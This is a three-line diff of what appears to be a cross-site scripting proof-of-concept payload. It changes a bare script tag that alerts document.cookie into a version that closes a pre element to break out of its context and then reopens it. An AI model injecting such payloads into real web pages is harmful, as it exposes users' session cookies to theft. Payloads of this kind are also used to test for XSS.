@@ -1,3 +1,3 @@
-<script>
+POC</pre><script>
 alert(document.cookie)
-</script>
+</script><pre>POC
